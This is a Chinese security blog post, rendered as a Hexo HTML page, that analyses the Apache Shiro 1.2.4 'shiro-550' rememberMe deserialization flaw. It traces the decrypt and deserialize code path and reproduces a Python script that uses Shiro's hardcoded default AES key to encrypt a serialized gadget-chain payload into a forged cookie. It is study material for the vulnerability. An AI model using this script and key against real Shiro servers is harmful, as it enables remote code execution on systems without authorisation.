@@ -1,0 +1,884 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="无聊ini">
+    <meta name="author" content="follycat">
+    <meta name="referrer" content="no-referrer" />
+    
+    <title>
+        
+            shiro-550 |
+        
+        follycatのblog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/wul.jpg">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"follycatのblog","author":"follycat","avatar":"/images/wul.jpg","logo":"/images/wul.jpg","favicon":"/images/wul.jpg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"If you're reading this, welcome to my blog!","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":true,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":true,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/wul.jpg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               follycatのblog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                HOME
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                ARCHIVES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                TAGS
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                CATEGORIES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            HOME
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            ARCHIVES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            TAGS
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            CATEGORIES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        shiro-550
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/wul.jpg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">follycat</span>
+                                
+                                    <span class="author-badge">Lv2</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-05-14 23:45:52</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Thu May 22 2025 23:06:50 GMT+0800">2025-05-22 23:06:50</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>1.3k Words</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>5 Mins</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><ul>
+<li>jdk8u65</li>
+<li>Tomcat8</li>
+<li>shiro 1.2.4</li>
+</ul>
+<p>漏洞影响版本：Shiro &lt;&#x3D; 1.2.4</p>
+<p>环境配置参考<a class="link" target="_blank" rel="noopener" href="https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#%E9%80%9A%E8%BF%87-CC11-%E9%93%BE%E6%94%BB%E5%87%BB">shiro<i class="fas fa-external-link-alt"></i></a></p>
+<p>注意事项：可以将p神项目中的pom.xml更改为1.8版本，要不然可能跑不起来。</p>
+<h1 id="shiro-550-漏洞分析"><a href="#shiro-550-漏洞分析" class="headerlink" title="shiro-550 漏洞分析"></a>shiro-550 漏洞分析</h1><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1746530385248-6b53acf5-0590-4d5b-9b31-c074b6530317.png"></p>
+<p>当rememberMe字段开启时，如果登录成功，返回包将会返回Set-Cookie，其中设置rememberMe字段，并且在之后的所有请求的cookie中都会存在rememberMe&#x3D;字段，可以通过该字段进行反序列化， 从而 getshell。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1746530577150-bf513be3-e1cf-41ba-ac6f-d7646bc8d634.png"></p>
+<p>造成这个漏洞的原因是因为在Shiro1.2.4 及之前的版本中，AES加密的密钥为硬编码在代码里，因此可以伪造rememberMe的加密。</p>
+<p>shiro的鉴权功能默认在拦截器中会进行调用，由于ShiroFilter的匹配规则是&#x2F;*，所以所有的请求都会被他处理，并进行权限校验，具体流程可以参考：<a class="link" target="_blank" rel="noopener" href="https://www.cnblogs.com/77cxw/p/18092865">https://www.cnblogs.com/77cxw/p/18092865<i class="fas fa-external-link-alt"></i></a></p>
+<p>这里从DefultSecurityManager#createSubject开始分析，这个方法用于创建一个完整的用户主体对象，并且对接受的请求做了一系列操作( 如：复制上下文、处理会话和身份信息等)，在处理身份信息的过程中将会触发解密以及反序列化的一系列操作。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1746622106419-6a9f900c-98b4-4195-8919-867f2b1af52d.png"></p>
+<p>跟进resolverPrincipals方法，这个方法拥有处理用户的身份信息，在shiro1.2.4中也就是rememberMe字段。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1746622320121-19de6c29-4fe8-4f33-802f-13ab840cac5b.png"></p>
+<p>在resolvePrincipals中，首先获取当前上下文中已存储的身份信息，并判断是否为空，如果为空，则查找并获取之前rememberMe记住的身份信息，也就是进入getRememberedIdentity方法中。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1746625264834-55530133-58d0-4fe2-bad6-83b74b7848e4.png"></p>
+<p>这个方法用于判断rememberMe是否打开，如果不为空，则说明启用了rememberMe功能，继续跟进getRememberedPrincipals方法，这是一个接口方法，具体的实现方法位于<code>org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1746625705033-bb81a7e0-68d1-466f-9639-22b1951366ca.png"></p>
+<p>这个方法就是我们获取rememberMe的序列化数据，以及对其进行解密和反序列化操作的方法了，首先可以看到这个方法先从getRememberedSerializedIdentity方法中获取了序列化数据，可以跟进去瞅瞅，也就是<code>org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity</code>这个类继承了<code>AbstractRememberMeManager</code>类，从而实现了getRememberedSerializedIdentity方法。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1746626490919-12e2b460-d5e3-473f-b68a-0d0447af3cc5.png"></p>
+<p>这个类的主要作用就是获取Cookie中的rememberMe的值，并返回其base64解密后的结果，回到<code>getRememberedPrincipals</code>方法中，在获取到了序列化数据之后，如果不为空，就会进入convertBytesToPrincipals方法中对其进行解密和反序列化操作，也就是decrypt()和deserialize()</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1746626977138-f4d3df9e-bad7-4a92-bf0a-3378971bb4b8.png"></p>
+<h2 id="decrypt-解密"><a href="#decrypt-解密" class="headerlink" title="decrypt()解密"></a>decrypt()解密</h2><p>分析解密的主要原因就是，我们需要伪造一个Cookie值，因此需要获得AES解密的密钥。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1746627140325-9a77e99f-a309-4b64-be6e-d401e300afa5.png"></p>
+<p>进入decrypt()方法，可以看到其解密操作是<code>cipherService.decrypt</code>方法，这个方法获取的第二个参数就是密钥，也就是getDecryptionCipherKey()方法返回的数据。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1746627328386-f9d1d5e8-26ce-43fd-95d8-5cd0ae34d2fc.png"></p>
+<p>跟进后发现其返回decryptionCipherKey这个参数，赋值的方法就是下面的<code>setDecryptionCipherKey</code>方法</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1746627446275-06d64185-7e48-4fb9-8fc3-a24ee3606b1c.png"></p>
+<p>查找谁调用了这个方法，从而寻找密钥的值，找到setCipherKey方法。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1746627505140-e76c4fef-fec8-404b-a476-219c5ffd55f1.png"></p>
+<p>继续查找谁调用了这个方法。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1746627596896-804cda58-bfdc-40fa-815e-437c188bb5a9.png"></p>
+<p>找到AbstractRememberMeManager，并给了一个固定的参数，这个参数在上面有赋值，从而得到固定的key。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1746627735493-53347223-916f-4f19-90da-63e422afe75c.png"></p>
+<h2 id="deserialize-反序列化"><a href="#deserialize-反序列化" class="headerlink" title="deserialize()反序列化"></a>deserialize()反序列化</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1746774052866-25c41f8f-4333-4b30-8319-661ac0c96bad.png"></p>
+<p>跟进到deserialize()方法里，可以发现这是一个接口，查看实现方法有哪些。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1746774495368-9ed4535d-8f0e-4c2f-ac1e-e0b0c6ec0ceb.png"></p>
+<p>可以找到shiro包里的deserial()方法，其中调用了readObject()，所以存在反序列化漏洞。</p>
+<h2 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h2><p>加密过程通过调试来进行分析，将断点打在onSuccessfulLogin中</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1746776802251-5ee10684-583c-486a-8933-1d9b7784cdad.png"></p>
+<p>跟进到rememberIdentity方法里，这里用于用户名赋值以及保存。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1746776970816-ed59173b-262b-4ec0-b469-9e7491135e81.png"></p>
+<p>继续跟进到convertPrincipalsToBytes，这里进行了数据序列化操作，以及加密操作。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1746781956311-7ebb4d55-a6b5-4c9a-99da-5dfc351a95fa.png"></p>
+<p>加密操作和解密是差不多的，进入encrypt()</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1746789297834-206553c4-e2c0-4244-9088-462243833f4a.png"></p>
+<p>看到getEncryptionCipherKey()中，继续跟进就可以找到调用的常量和之前的解密的一样。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1746789465573-1528b7ed-ea80-4af4-8ae5-c4816face29b.png">、</p>
+<h1 id="shiro-550漏洞利用"><a href="#shiro-550漏洞利用" class="headerlink" title="shiro-550漏洞利用"></a>shiro-550漏洞利用</h1><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><p>这里直接使用Drunkbaby师傅的脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"># －*-* coding:utf-8</span><br><span class="line"># @Time    :  2022/7/13 17:36</span><br><span class="line"># @Author  : Drunkbaby</span><br><span class="line"># @FileName: poc.py</span><br><span class="line"># @Software: VSCode</span><br><span class="line"># @Blog    ：https://drun1baby.github.io/</span><br><span class="line"></span><br><span class="line">from email.mime import base</span><br><span class="line">from pydoc import plain</span><br><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line">from turtle import mode</span><br><span class="line">import uuid</span><br><span class="line">from random import Random</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_file_data(filename):</span><br><span class="line"> with open(filename, &#x27;rb&#x27;) as f:</span><br><span class="line"> data = f.read()</span><br><span class="line"> return data</span><br><span class="line"></span><br><span class="line">def aes_enc(data):</span><br><span class="line"> BS = AES.block_size</span><br><span class="line"> pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line"> key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br><span class="line"> mode = AES.MODE_CBC</span><br><span class="line"> iv = uuid.uuid4().bytes</span><br><span class="line"> encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line"> ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))</span><br><span class="line"> return ciphertext</span><br><span class="line"></span><br><span class="line">def aes_dec(enc_data):</span><br><span class="line"> enc_data = base64.b64decode(enc_data)</span><br><span class="line"> unpad = lambda s: s[:-s[-1]]</span><br><span class="line"> key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br><span class="line"> mode = AES.MODE_CBC</span><br><span class="line"> iv = enc_data[:16]</span><br><span class="line"> encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line"> plaintext = encryptor.decrypt(enc_data[16:])</span><br><span class="line"> plaintext = unpad(plaintext)</span><br><span class="line"> return plaintext</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line"> data = get_file_data(&quot;ser.bin&quot;)</span><br><span class="line"> print(aes_enc(data))</span><br><span class="line">	</span><br></pre></td></tr></table></figure>
+
+<h2 id="CC11"><a href="#CC11" class="headerlink" title="CC11"></a>CC11</h2><p>用之前的链子就行,生成ser.bin然后加密。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1746795084301-6df55ea6-6e02-40be-827d-09887875295a.png"></p>
+<h2 id="CB1"><a href="#CB1" class="headerlink" title="CB1"></a>CB1</h2><p>cb链有版本问题，之前用的是1.9.2的，shiro自带的是1.8.3的，更改一下版本就可以了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1746795153457-c3dda4df-9987-4e3c-b4a5-5c6bfd7c75cd.png"></p>
+<p>#参考文章<br><a class="link" target="_blank" rel="noopener" href="https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#%E9%80%9A%E8%BF%87-CC11-%E9%93%BE%E6%94%BB%E5%87%BB">https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#%E9%80%9A%E8%BF%87-CC11-%E9%93%BE%E6%94%BB%E5%87%BB<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://www.cnblogs.com/77cxw/p/18092865">https://www.cnblogs.com/77cxw/p/18092865<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://y0n3er.github.io/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BShiro550/">https://y0n3er.github.io/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BShiro550/<i class="fas fa-external-link-alt"></i></a></p>
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                shiro-550
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2025/05/14/shiro-550/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    Author
+                </div>
+                <div class="content">follycat</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    Published
+                </div>
+                <div class="content">2025-05-14 23:45</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    License
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="Copy copyright info" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="Share to WeChat"
+            data-tooltip-img-tip="Scan by WeChat"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to WeiBo"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2025/05/22/shiro-721/"
+                                   title="shiro-721"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">shiro-721</span>
+                                        <span class="post-nav-item">Prev posts</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/04/11/xxl-job%E5%AD%90%E4%BB%BB%E5%8A%A1%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%8F%8A%E4%BF%AE%E5%A4%8D%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90(CVE-2024-42681)/"
+                                   title="xxl-job子任务越权漏洞代码分析及修复代码分析(CVE-2024-42681)"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">xxl-job子任务越权漏洞代码分析及修复代码分析(CVE-2024-42681)</span>
+                                        <span class="post-nav-item">Next posts</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;Comments
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">Comment plugin failed to load</span>
+    <button class="reload keep-button">Click to reload</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">Loading comment plugin</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
+
+        
+            
+
+    <div class="configuration-items-error-tip border-box">
+    <i class="fa-solid fa-circle-exclamation"></i>
+    Please fill in the required configuration items for Valine comment plugin
+</div>
+
+
+
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#shiro-550-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">shiro-550 漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#decrypt-%E8%A7%A3%E5%AF%86"><span class="nav-text">decrypt()解密</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#deserialize-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">deserialize()反序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A0%E5%AF%86%E8%BF%87%E7%A8%8B"><span class="nav-text">加密过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#shiro-550%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">shiro-550漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A0%E5%AF%86"><span class="nav-text">加密</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CC11"><span class="nav-text">CC11</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CB1"><span class="nav-text">CB1</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2025
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">follycat</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+
+    
+        <div class="count-info info-item">
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">Unique Visitor</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">Page View</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
